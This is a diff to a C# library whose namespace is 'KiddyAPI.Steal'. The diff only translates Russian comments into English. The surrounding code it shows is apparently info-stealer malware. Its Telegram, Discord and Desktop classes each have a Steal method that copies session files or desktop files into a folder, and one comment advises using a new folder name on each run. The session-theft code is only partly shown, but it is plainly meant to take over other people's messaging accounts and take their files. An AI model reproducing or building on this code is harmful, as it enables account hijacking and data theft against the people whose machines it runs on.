@@ -12,16 +12,16 @@ namespace KiddyAPI.Steal
     public class Apps
     {
         /// <summary>
-        /// Получаем файлы Телеги
+        /// Work with Telegram
         /// </summary>
         public static class Telegram
         {
             private static bool inDir = false;
 
             /// <summary>
-            /// Получаем файлы сессии телеграмма
+            /// Get session files of Telegram
             /// </summary>
-            /// <param name="pathToCopy">Папка, куда скопируются файлы. Желательно генерировать новое имя каждый раз</param>
+            /// <param name="pathToCopy">Path to save session.It is advisable to generate a new name every time</param>
             public static void Steal(string pathToCopy)
             {
                 var processName = "Telegram";
@@ -39,7 +39,7 @@ namespace KiddyAPI.Steal
                     CopyAll(replace, pathToCopy + "\\Telegram\\");
                 }
             }
-
+            //Костыль
             private static void CopyAll(string fromDir, string toDir)
             {
 
@@ -86,15 +86,15 @@ namespace KiddyAPI.Steal
         }
 
         /// <summary>
-        /// Получаем файлы с Рабочего стола
+        /// Work with Desktop
         /// </summary>
         public static class Desktop
         {
             /// <summary>
-            /// Метод для получения файлов с Десктопа
+            /// Get files from Desktop
             /// </summary>
-            /// <param name="dirToCopy">Куда копировать</param>
-            /// <param name="rewrite">Перезапись файлов</param>
+            /// <param name="dirToCopy">Path to copy</param>
+            /// <param name="rewrite">Re-write</param>
             public static void Steal(string dirToCopy, bool rewrite)
             {
                 foreach (FileInfo file in new DirectoryInfo(
@@ -113,15 +113,15 @@ namespace KiddyAPI.Steal
         }
 
         /// <summary>
-        /// Дает доступ к сессии Дискорда
+        /// Work with Diskord
         /// </summary>
         public static class Discord
         {
             /// <summary>
-            /// Забираем файлы сессии
+            /// Get Diskord sessies files
             /// </summary>
-            /// <param name="pathToCopy">Папку, куда копировать</param>
-            /// <param name="rewrite">Перезапись файлов</param>
+            /// <param name="pathToCopy">Path to Copy</param>
+            /// <param name="rewrite">Re-write</param>
             public static void Steal(string pathToCopy, bool rewrite)
             {
                 string discordPath = Environment.ExpandEnvironmentVariables("%appdata%") +
